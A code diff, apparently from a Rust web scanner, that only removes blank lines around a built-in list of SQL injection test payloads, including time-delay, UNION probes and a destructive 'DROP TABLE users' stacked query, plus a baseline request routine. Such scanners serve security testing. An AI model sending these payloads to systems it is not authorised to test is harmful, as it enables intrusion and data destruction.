@@ -1,6 +1,5 @@
 use reqwest::Client;
 use url::Url;
-
 use crate::{
     error::Result,
     report::{Finding, Severity, ScanResult},
@@ -11,22 +10,18 @@ static PAYLOADS: &[(&str, &str)] = &[
     ("''",                         "doubled-quote"),
     ("\\",                         "backslash escape"),
     (";",                          "statement terminator"),
-
     ("' OR '1'='1",                "boolean OR true"),
     ("' OR '1'='2",                "boolean OR false"),
     ("1 AND 1=1",                  "integer AND true"),
     ("1 AND 1=2",                  "integer AND false"),
-
     ("'; WAITFOR DELAY '0:0:3'--", "MSSQL time-delay"),
     ("'; SELECT SLEEP(3)--",       "MySQL time-delay"),
- 
+
     ("' UNION SELECT NULL--",      "UNION NULL probe"),
     ("' UNION SELECT NULL,NULL--", "UNION NULL,NULL probe"),
-
     ("'--",                        "comment terminator --"),
     ("'#",                         "comment terminator #"),
     ("' /*",                       "inline comment /*"),
-
     ("'; DROP TABLE users--",      "stacked query"),
 ];
 
@@ -71,7 +66,6 @@ pub async fn scan(
             Some((parts.next()?.to_string(), parts.next()?.to_string()))
         })
         .collect();
-
     let baseline_url = build_url(&base, param, "1", &extras);
     let baseline_resp = client.get(baseline_url.as_str()).send().await?;
     let baseline_body = baseline_resp.text().await?.to_lowercase();
